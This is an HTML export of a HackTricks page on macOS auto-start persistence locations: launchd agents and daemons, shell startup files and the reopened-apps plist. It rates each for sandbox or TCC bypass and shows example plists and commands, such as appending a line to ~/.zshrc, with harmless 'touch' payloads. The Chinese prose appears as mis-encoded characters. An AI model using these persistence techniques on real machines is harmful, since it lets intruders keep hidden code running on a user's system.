<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>macOS Auto Start</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="macos-è‡ªåŠ¨å¯åŠ¨"><a class="header" href="#macos-è‡ªåŠ¨å¯åŠ¨">macOS è‡ªåŠ¨å¯åŠ¨</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<p>æœ¬èŠ‚å†…å®¹ä¸»è¦åŸºäºåšå®¢ç³»åˆ— <a href="https://theevilbit.github.io/beyond/"><strong>è¶…è¶Šä¼ ç»Ÿçš„ LaunchAgents</strong></a>ï¼Œç›®æ ‡æ˜¯æ·»åŠ  <strong>æ›´å¤šè‡ªåŠ¨å¯åŠ¨ä½ç½®</strong>ï¼ˆå¦‚æœå¯èƒ½ï¼‰ï¼ŒæŒ‡æ˜ <strong>å“ªäº›æŠ€æœ¯åœ¨æœ€æ–°ç‰ˆæœ¬çš„ macOSï¼ˆ13.4ï¼‰ä¸­ä»ç„¶æœ‰æ•ˆ</strong>ï¼Œå¹¶æŒ‡å®šæ‰€éœ€çš„ <strong>æƒé™</strong>ã€‚</p>
<h2 id="æ²™ç®±ç»•è¿‡"><a class="header" href="#æ²™ç®±ç»•è¿‡">æ²™ç®±ç»•è¿‡</a></h2>
<p>{% hint style="success" %}
åœ¨è¿™é‡Œæ‚¨å¯ä»¥æ‰¾åˆ°å¯¹ <strong>æ²™ç®±ç»•è¿‡</strong> æœ‰ç”¨çš„å¯åŠ¨ä½ç½®ï¼Œå®ƒå…è®¸æ‚¨é€šè¿‡ <strong>å°†å…¶å†™å…¥æ–‡ä»¶</strong> å¹¶ <strong>ç­‰å¾…</strong> ä¸€ä¸ªéå¸¸ <strong>å¸¸è§</strong> çš„ <strong>æ“ä½œ</strong>ã€ç‰¹å®šçš„ <strong>æ—¶é—´</strong> æˆ–æ‚¨é€šå¸¸å¯ä»¥åœ¨æ²™ç®±å†…æ‰§è¡Œçš„ <strong>æ“ä½œ</strong> æ¥ç®€å•åœ°æ‰§è¡ŒæŸäº›å†…å®¹ï¼Œè€Œæ— éœ€æ ¹æƒé™ã€‚
{% endhint %}</p>
<h3 id="launchd"><a class="header" href="#launchd">Launchd</a></h3>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç®±ï¼š<a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡ï¼š<a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®"><a class="header" href="#ä½ç½®">ä½ç½®</a></h4>
<ul>
<li><strong><code>/Library/LaunchAgents</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šé‡å¯</li>
<li>éœ€è¦æ ¹æƒé™</li>
<li><strong><code>/Library/LaunchDaemons</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šé‡å¯</li>
<li>éœ€è¦æ ¹æƒé™</li>
<li><strong><code>/System/Library/LaunchAgents</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šé‡å¯</li>
<li>éœ€è¦æ ¹æƒé™</li>
<li><strong><code>/System/Library/LaunchDaemons</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šé‡å¯</li>
<li>éœ€è¦æ ¹æƒé™</li>
<li><strong><code>~/Library/LaunchAgents</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šé‡æ–°ç™»å½•</li>
<li><strong><code>~/Library/LaunchDemons</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šé‡æ–°ç™»å½•</li>
</ul>
<p>{% hint style="success" %}
æœ‰è¶£çš„æ˜¯ï¼Œ<strong><code>launchd</code></strong> åœ¨ Mach-o éƒ¨åˆ† <code>__Text.__config</code> ä¸­åµŒå…¥äº†ä¸€ä¸ªå±æ€§åˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«å…¶ä»–çŸ¥åæœåŠ¡ï¼Œlaunchd å¿…é¡»å¯åŠ¨ã€‚æ­¤å¤–ï¼Œè¿™äº›æœåŠ¡å¯ä»¥åŒ…å« <code>RequireSuccess</code>ã€<code>RequireRun</code> å’Œ <code>RebootOnSuccess</code>ï¼Œè¿™æ„å‘³ç€å®ƒä»¬å¿…é¡»è¿è¡Œå¹¶æˆåŠŸå®Œæˆã€‚</p>
<p>å½“ç„¶ï¼Œç”±äºä»£ç ç­¾åï¼Œå®ƒæ— æ³•è¢«ä¿®æ”¹ã€‚
{% endhint %}</p>
<h4 id="æè¿°ä¸åˆ©ç”¨"><a class="header" href="#æè¿°ä¸åˆ©ç”¨">æè¿°ä¸åˆ©ç”¨</a></h4>
<p><strong><code>launchd</code></strong> æ˜¯ OX S å†…æ ¸åœ¨å¯åŠ¨æ—¶æ‰§è¡Œçš„ <strong>ç¬¬ä¸€ä¸ª</strong> <strong>è¿›ç¨‹</strong>ï¼Œå¹¶ä¸”åœ¨å…³æœºæ—¶æ˜¯æœ€åä¸€ä¸ªå®Œæˆçš„è¿›ç¨‹ã€‚å®ƒåº”è¯¥å§‹ç»ˆå…·æœ‰ <strong>PID 1</strong>ã€‚è¯¥è¿›ç¨‹å°† <strong>è¯»å–å¹¶æ‰§è¡Œ</strong> åœ¨ä»¥ä¸‹ <strong>ASEP</strong> <strong>plist</strong> ä¸­æŒ‡ç¤ºçš„é…ç½®ï¼š</p>
<ul>
<li><code>/Library/LaunchAgents</code>ï¼šç”±ç®¡ç†å‘˜å®‰è£…çš„æ¯ç”¨æˆ·ä»£ç†</li>
<li><code>/Library/LaunchDaemons</code>ï¼šç”±ç®¡ç†å‘˜å®‰è£…çš„ç³»ç»ŸèŒƒå›´å®ˆæŠ¤è¿›ç¨‹</li>
<li><code>/System/Library/LaunchAgents</code>ï¼šç”± Apple æä¾›çš„æ¯ç”¨æˆ·ä»£ç†ã€‚</li>
<li><code>/System/Library/LaunchDaemons</code>ï¼šç”± Apple æä¾›çš„ç³»ç»ŸèŒƒå›´å®ˆæŠ¤è¿›ç¨‹ã€‚</li>
</ul>
<p>å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œä½äº <code>/Users/$USER/Library/LaunchAgents</code> å’Œ <code>/Users/$USER/Library/LaunchDemons</code> çš„ plist å°†ä»¥ <strong>ç™»å½•ç”¨æˆ·çš„æƒé™</strong> å¯åŠ¨ã€‚</p>
<p><strong>ä»£ç†å’Œå®ˆæŠ¤è¿›ç¨‹ä¹‹é—´çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œä»£ç†åœ¨ç”¨æˆ·ç™»å½•æ—¶åŠ è½½ï¼Œè€Œå®ˆæŠ¤è¿›ç¨‹åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½</strong>ï¼ˆå› ä¸ºæœ‰äº›æœåŠ¡å¦‚ ssh éœ€è¦åœ¨ä»»ä½•ç”¨æˆ·è®¿é—®ç³»ç»Ÿä¹‹å‰æ‰§è¡Œï¼‰ã€‚æ­¤å¤–ï¼Œä»£ç†å¯ä»¥ä½¿ç”¨ GUIï¼Œè€Œå®ˆæŠ¤è¿›ç¨‹éœ€è¦åœ¨åå°è¿è¡Œã€‚</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;Label&lt;/key&gt;
&lt;string&gt;com.apple.someidentifier&lt;/string&gt;
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;bash -c 'touch /tmp/launched'&lt;/string&gt; &lt;!--Prog to execute--&gt;
&lt;/array&gt;
&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt; &lt;!--Execute at system startup--&gt;
&lt;key&gt;StartInterval&lt;/key&gt;
&lt;integer&gt;800&lt;/integer&gt; &lt;!--Execute each 800s--&gt;
&lt;key&gt;KeepAlive&lt;/key&gt;
&lt;dict&gt;
&lt;key&gt;SuccessfulExit&lt;/key&gt;&lt;/false&gt; &lt;!--Re-execute if exit unsuccessful--&gt;
&lt;!--If previous is true, then re-execute in successful exit--&gt;
&lt;/dict&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>æœ‰äº›æƒ…å†µä¸‹ï¼Œ<strong>ä»£ç†éœ€è¦åœ¨ç”¨æˆ·ç™»å½•ä¹‹å‰æ‰§è¡Œ</strong>ï¼Œè¿™äº›è¢«ç§°ä¸º<strong>PreLoginAgents</strong>ã€‚ä¾‹å¦‚ï¼Œè¿™åœ¨ç™»å½•æ—¶æä¾›è¾…åŠ©æŠ€æœ¯æ˜¯æœ‰ç”¨çš„ã€‚å®ƒä»¬ä¹Ÿå¯ä»¥åœ¨<code>/Library/LaunchAgents</code>ä¸­æ‰¾åˆ°ï¼ˆè¯·å‚è§<a href="https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents"><strong>è¿™é‡Œ</strong></a>çš„ç¤ºä¾‹ï¼‰ã€‚</p>
<p>{% hint style="info" %}
æ–°çš„å®ˆæŠ¤è¿›ç¨‹æˆ–ä»£ç†é…ç½®æ–‡ä»¶å°†åœ¨<strong>ä¸‹æ¬¡é‡å¯åæˆ–ä½¿ç”¨</strong> <code>launchctl load &lt;target.plist&gt;</code> <strong>åŠ è½½</strong>ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨<code>launchctl -F &lt;file&gt;</code> <strong>åŠ è½½æ²¡æœ‰è¯¥æ‰©å±•åçš„.plistæ–‡ä»¶</strong>ï¼ˆä½†æ˜¯è¿™äº›plistæ–‡ä»¶åœ¨é‡å¯åä¸ä¼šè‡ªåŠ¨åŠ è½½ï¼‰ã€‚<br />
ä¹Ÿå¯ä»¥ä½¿ç”¨<code>launchctl unload &lt;target.plist&gt;</code> <strong>å¸è½½</strong>ï¼ˆæŒ‡å‘çš„è¿›ç¨‹å°†è¢«ç»ˆæ­¢ï¼‰ï¼Œ</p>
<p>è¦<strong>ç¡®ä¿</strong>æ²¡æœ‰<strong>ä»»ä½•</strong>ï¼ˆå¦‚è¦†ç›–ï¼‰<strong>é˜»æ­¢</strong>ä»£ç†æˆ–å®ˆæŠ¤è¿›ç¨‹<strong>è¿è¡Œ</strong>ï¼Œè¯·è¿è¡Œï¼š<code>sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist</code>
{% endhint %}</p>
<p>åˆ—å‡ºå½“å‰ç”¨æˆ·åŠ è½½çš„æ‰€æœ‰ä»£ç†å’Œå®ˆæŠ¤è¿›ç¨‹ï¼š</p>
<pre><code class="language-bash">launchctl list
</code></pre>
<p>{% hint style="warning" %}
å¦‚æœä¸€ä¸ª plist æ–‡ä»¶å±äºä¸€ä¸ªç”¨æˆ·ï¼Œå³ä½¿å®ƒåœ¨å®ˆæŠ¤è¿›ç¨‹çš„ç³»ç»ŸèŒƒå›´æ–‡ä»¶å¤¹ä¸­ï¼Œ<strong>ä»»åŠ¡å°†ä»¥ç”¨æˆ·èº«ä»½æ‰§è¡Œ</strong>è€Œä¸æ˜¯ä»¥ root èº«ä»½æ‰§è¡Œã€‚è¿™å¯ä»¥é˜²æ­¢æŸäº›ç‰¹æƒå‡çº§æ”»å‡»ã€‚
{% endhint %}</p>
<h4 id="å…³äº-launchd-çš„æ›´å¤šä¿¡æ¯"><a class="header" href="#å…³äº-launchd-çš„æ›´å¤šä¿¡æ¯">å…³äº launchd çš„æ›´å¤šä¿¡æ¯</a></h4>
<p><strong><code>launchd</code></strong> æ˜¯ä» <strong>å†…æ ¸</strong> å¯åŠ¨çš„ <strong>ç¬¬ä¸€ä¸ª</strong> ç”¨æˆ·æ¨¡å¼è¿›ç¨‹ã€‚è¿›ç¨‹å¯åŠ¨å¿…é¡»æ˜¯ <strong>æˆåŠŸçš„</strong>ï¼Œå¹¶ä¸” <strong>ä¸èƒ½é€€å‡ºæˆ–å´©æºƒ</strong>ã€‚å®ƒç”šè‡³å¯¹æŸäº› <strong>æ€æ­»ä¿¡å·</strong> è¿›è¡Œäº† <strong>ä¿æŠ¤</strong>ã€‚</p>
<p><code>launchd</code> é¦–å…ˆè¦åšçš„äº‹æƒ…ä¹‹ä¸€æ˜¯ <strong>å¯åŠ¨</strong> æ‰€æœ‰çš„ <strong>å®ˆæŠ¤è¿›ç¨‹</strong>ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>åŸºäºæ—¶é—´æ‰§è¡Œçš„ <strong>å®šæ—¶å®ˆæŠ¤è¿›ç¨‹</strong>ï¼š</li>
<li>atd (<code>com.apple.atrun.plist</code>): æœ‰ä¸€ä¸ª <code>StartInterval</code> ä¸º 30 åˆ†é’Ÿ</li>
<li>crond (<code>com.apple.systemstats.daily.plist</code>): æœ‰ <code>StartCalendarInterval</code> åœ¨ 00:15 å¯åŠ¨</li>
<li><strong>ç½‘ç»œå®ˆæŠ¤è¿›ç¨‹</strong>ï¼Œä¾‹å¦‚ï¼š</li>
<li><code>org.cups.cups-lpd</code>: åœ¨ TCP (<code>SockType: stream</code>) ä¸Šç›‘å¬ï¼Œ<code>SockServiceName: printer</code></li>
<li>SockServiceName å¿…é¡»æ˜¯ <code>/etc/services</code> ä¸­çš„ç«¯å£æˆ–æœåŠ¡</li>
<li><code>com.apple.xscertd.plist</code>: åœ¨ TCP ç«¯å£ 1640 ä¸Šç›‘å¬</li>
<li><strong>è·¯å¾„å®ˆæŠ¤è¿›ç¨‹</strong>ï¼Œåœ¨æŒ‡å®šè·¯å¾„æ›´æ”¹æ—¶æ‰§è¡Œï¼š</li>
<li><code>com.apple.postfix.master</code>: æ£€æŸ¥è·¯å¾„ <code>/etc/postfix/aliases</code></li>
<li><strong>IOKit é€šçŸ¥å®ˆæŠ¤è¿›ç¨‹</strong>ï¼š</li>
<li><code>com.apple.xartstorageremoted</code>: <code>"com.apple.iokit.matching" =&gt; { "com.apple.device-attach" =&gt; { "IOMatchLaunchStream" =&gt; 1 ...</code></li>
<li><strong>Mach ç«¯å£ï¼š</strong></li>
<li><code>com.apple.xscertd-helper.plist</code>: åœ¨ <code>MachServices</code> æ¡ç›®ä¸­æŒ‡ç¤ºåç§° <code>com.apple.xscertd.helper</code></li>
<li><strong>UserEventAgentï¼š</strong></li>
<li>è¿™ä¸ä¹‹å‰çš„ä¸åŒã€‚å®ƒä½¿ launchd åœ¨å“åº”ç‰¹å®šäº‹ä»¶æ—¶ç”Ÿæˆåº”ç”¨ç¨‹åºã€‚ç„¶è€Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¶‰åŠçš„ä¸»è¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸æ˜¯ <code>launchd</code>ï¼Œè€Œæ˜¯ <code>/usr/libexec/UserEventAgent</code>ã€‚å®ƒä» SIP å—é™æ–‡ä»¶å¤¹ /System/Library/UserEventPlugins/ åŠ è½½æ’ä»¶ï¼Œæ¯ä¸ªæ’ä»¶åœ¨ <code>XPCEventModuleInitializer</code> é”®ä¸­æŒ‡ç¤ºå…¶åˆå§‹åŒ–ç¨‹åºï¼Œæˆ–è€…åœ¨æ—§æ’ä»¶çš„æƒ…å†µä¸‹ï¼Œåœ¨å…¶ <code>Info.plist</code> çš„ <code>FB86416D-6164-2070-726F-70735C216EC0</code> é”®ä¸‹çš„ <code>CFPluginFactories</code> å­—å…¸ä¸­ã€‚</li>
</ul>
<h3 id="shell-å¯åŠ¨æ–‡ä»¶"><a class="header" href="#shell-å¯åŠ¨æ–‡ä»¶">shell å¯åŠ¨æ–‡ä»¶</a></h3>
<p>å†™ä½œï¼š <a href="https://theevilbit.github.io/beyond/beyond_0001/">https://theevilbit.github.io/beyond/beyond_0001/</a><br />
å†™ä½œ (xterm)ï¼š <a href="https://theevilbit.github.io/beyond/beyond_0018/">https://theevilbit.github.io/beyond/beyond_0018/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’ï¼š <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡ï¼š <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>ä½†ä½ éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå…·æœ‰ TCC ç»•è¿‡çš„åº”ç”¨ç¨‹åºï¼Œè¯¥åº”ç”¨ç¨‹åºæ‰§è¡Œä¸€ä¸ªåŠ è½½è¿™äº›æ–‡ä»¶çš„ shell</li>
</ul>
<h4 id="ä½ç½®-1"><a class="header" href="#ä½ç½®-1">ä½ç½®</a></h4>
<ul>
<li><strong><code>~/.zshrc</code>, <code>~/.zlogin</code>, <code>~/.zshenv.zwc</code></strong>, <strong><code>~/.zshenv</code>, <code>~/.zprofile</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šæ‰“å¼€ä¸€ä¸ª zsh ç»ˆç«¯</li>
<li><strong><code>/etc/zshenv</code>, <code>/etc/zprofile</code>, <code>/etc/zshrc</code>, <code>/etc/zlogin</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šæ‰“å¼€ä¸€ä¸ª zsh ç»ˆç«¯</li>
<li>éœ€è¦ root æƒé™</li>
<li><strong><code>~/.zlogout</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šé€€å‡ºä¸€ä¸ª zsh ç»ˆç«¯</li>
<li><strong><code>/etc/zlogout</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šé€€å‡ºä¸€ä¸ª zsh ç»ˆç«¯</li>
<li>éœ€è¦ root æƒé™</li>
<li>å¯èƒ½è¿˜æœ‰æ›´å¤šï¼š <strong><code>man zsh</code></strong></li>
<li><strong><code>~/.bashrc</code></strong></li>
<li><strong>è§¦å‘</strong>ï¼šæ‰“å¼€ä¸€ä¸ª bash ç»ˆç«¯</li>
<li><code>/etc/profile</code>ï¼ˆæœªç”Ÿæ•ˆï¼‰</li>
<li><code>~/.profile</code>ï¼ˆæœªç”Ÿæ•ˆï¼‰</li>
<li><code>~/.xinitrc</code>, <code>~/.xserverrc</code>, <code>/opt/X11/etc/X11/xinit/xinitrc.d/</code></li>
<li><strong>è§¦å‘</strong>ï¼šé¢„è®¡åœ¨ xterm ä¸­è§¦å‘ï¼Œä½† <strong>æœªå®‰è£…</strong>ï¼Œå³ä½¿å®‰è£…åä¹Ÿä¼šæŠ›å‡ºæ­¤é”™è¯¯ï¼šxterm: <code>DISPLAY is not set</code></li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-1"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-1">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>å½“å¯åŠ¨ä¸€ä¸ª shell ç¯å¢ƒï¼Œå¦‚ <code>zsh</code> æˆ– <code>bash</code> æ—¶ï¼Œ<strong>ä¼šè¿è¡ŒæŸäº›å¯åŠ¨æ–‡ä»¶</strong>ã€‚macOS å½“å‰ä½¿ç”¨ <code>/bin/zsh</code> ä½œä¸ºé»˜è®¤ shellã€‚å½“å¯åŠ¨ç»ˆç«¯åº”ç”¨ç¨‹åºæˆ–é€šè¿‡ SSH è®¿é—®è®¾å¤‡æ—¶ï¼Œè‡ªåŠ¨è®¿é—®æ­¤ shellã€‚è™½ç„¶ <code>bash</code> å’Œ <code>sh</code> ä¹Ÿå­˜åœ¨äº macOS ä¸­ï¼Œä½†éœ€è¦æ˜¾å¼è°ƒç”¨æ‰èƒ½ä½¿ç”¨ã€‚</p>
<p>zsh çš„æ‰‹å†Œé¡µï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <strong><code>man zsh</code></strong> é˜…è¯»ï¼Œè¯¦ç»†æè¿°äº†å¯åŠ¨æ–‡ä»¶ã€‚</p>
<pre><code class="language-bash"># Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" &gt;&gt; ~/.zshrc
</code></pre>
<h3 id="é‡æ–°æ‰“å¼€çš„åº”ç”¨ç¨‹åº"><a class="header" href="#é‡æ–°æ‰“å¼€çš„åº”ç”¨ç¨‹åº">é‡æ–°æ‰“å¼€çš„åº”ç”¨ç¨‹åº</a></h3>
<p>{% hint style="danger" %}
é…ç½®æ‰€ç¤ºçš„åˆ©ç”¨å’Œæ³¨é”€å†ç™»å½•æˆ–ç”šè‡³é‡å¯å¯¹æˆ‘æ‰§è¡Œåº”ç”¨ç¨‹åºæ²¡æœ‰æ•ˆæœã€‚ ï¼ˆåº”ç”¨ç¨‹åºæ²¡æœ‰è¢«æ‰§è¡Œï¼Œä¹Ÿè®¸åœ¨æ‰§è¡Œè¿™äº›æ“ä½œæ—¶éœ€è¦å®ƒæ­£åœ¨è¿è¡Œï¼‰
{% endhint %}</p>
<p><strong>å†™ä½œ</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0021/">https://theevilbit.github.io/beyond/beyond_0021/</a></p>
<ul>
<li>æœ‰åŠ©äºç»•è¿‡æ²™ç›’: <a href="https://emojipedia.org/check-mark-button">âœ…</a></li>
<li>TCC ç»•è¿‡: <a href="https://emojipedia.org/large-red-circle">ğŸ”´</a></li>
</ul>
<h4 id="ä½ç½®-2"><a class="header" href="#ä½ç½®-2">ä½ç½®</a></h4>
<ul>
<li><strong><code>~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist</code></strong></li>
<li><strong>è§¦å‘å™¨</strong>: é‡å¯é‡æ–°æ‰“å¼€åº”ç”¨ç¨‹åº</li>
</ul>
<h4 id="æè¿°ä¸åˆ©ç”¨-2"><a class="header" href="#æè¿°ä¸åˆ©ç”¨-2">æè¿°ä¸åˆ©ç”¨</a></h4>
<p>æ‰€æœ‰è¦é‡æ–°æ‰“å¼€çš„åº”ç”¨ç¨‹åºéƒ½åœ¨ plist <code>~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist</code> ä¸­</p>
<p>å› æ­¤ï¼Œè¦ä½¿é‡æ–°æ‰“å¼€çš„åº”ç”¨ç¨‹åºå¯åŠ¨æ‚¨è‡ªå·±çš„åº”ç”¨ç¨‹åºï¼Œæ‚¨åªéœ€ <strong>å°†æ‚¨çš„åº”ç”¨ç¨‹åºæ·»åŠ åˆ°åˆ—è¡¨ä¸­</strong>ã€‚</p>
<p>UUID å¯ä»¥é€šè¿‡åˆ—å‡ºè¯¥ç›®å½•æˆ–ä½¿ç”¨ <code>ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'</code> æ‰¾åˆ°</p>
<p>è¦æ£€æŸ¥å°†è¦é‡æ–°æ‰“å¼€çš„åº”ç”¨ç¨‹åºï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š</p>
<pre><code class="language-bash">defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.&lt;UUID&gt;.plist
</code></pre>
